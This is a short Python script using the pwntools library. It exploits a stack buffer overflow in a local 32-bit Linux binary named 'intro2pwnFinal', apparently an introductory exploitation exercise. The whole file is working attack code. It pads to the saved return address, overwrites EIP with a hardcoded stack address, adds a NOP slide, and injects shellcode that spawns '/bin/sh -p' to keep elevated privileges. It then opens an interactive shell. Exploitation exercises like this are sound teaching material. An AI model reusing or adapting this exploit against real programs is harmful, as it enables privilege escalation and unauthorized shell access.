from pwn import *

context.update(arch='i386', os='linux')

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd530+200)
slide = "\x90"*1000

shellcode = asm(shellcraft.execve(path='/bin/sh',argv=['sh','-p']))

payload=padding+eip+slide+shellcode

proc = process('./intro2pwnFinal')
proc.recvline()
proc.send(payload)
proc.interactive()
